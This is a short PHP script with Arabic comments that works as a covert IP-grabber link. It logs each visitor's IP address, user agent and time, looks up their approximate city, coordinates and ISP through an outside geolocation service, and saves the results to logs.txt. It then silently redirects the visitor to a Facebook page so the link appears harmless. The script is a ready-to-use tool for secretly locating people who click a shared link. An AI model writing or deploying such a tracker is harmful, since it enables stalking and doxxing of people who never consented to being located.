<?php
date_default_timezone_set("Africa/Cairo");

// بيانات الزائر
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$time = date("Y-m-d H:i:s");

// API لجلب معلومات الموقع ونوع الجهاز
$apiUrl = "https://ipapi.co/$ip/json/";
$response = file_get_contents($apiUrl);
$data = json_decode($response, true);

// بيانات الموقع الجغرافي
$country = $data['country_name'] ?? 'Unknown';
$region = $data['region'] ?? 'Unknown';
$city = $data['city'] ?? 'Unknown';
$latitude = $data['latitude'] ?? 'Unknown';
$longitude = $data['longitude'] ?? 'Unknown';
$org = $data['org'] ?? 'Unknown';

// تحديد نوع الجهاز بشكل مبدأي
$deviceType = 'Unknown';
if (preg_match('/mobile/i', $userAgent)) {
    $deviceType = 'Mobile';
} elseif (preg_match('/tablet/i', $userAgent)) {
    $deviceType = 'Tablet';
} elseif (preg_match('/linux|windows|macintosh/i', $userAgent)) {
    $deviceType = 'Desktop';
}

// سجل البيانات
$log = "=============================\n";
$log .= "IP: $ip\n";
$log .= "Country: $country\n";
$log .= "Region: $region\n";
$log .= "City: $city\n";
$log .= "Latitude: $latitude | Longitude: $longitude\n";
$log .= "Organization: $org\n";
$log .= "Device Type: $deviceType\n";
$log .= "User Agent: $userAgent\n";
$log .= "Time: $time\n";

// حفظ في logs.txt
file_put_contents("logs.txt", $log, FILE_APPEND);

// إعادة التوجيه لصفحتك
header("Location: https://www.facebook.com/elmercato0");
exit;
?>
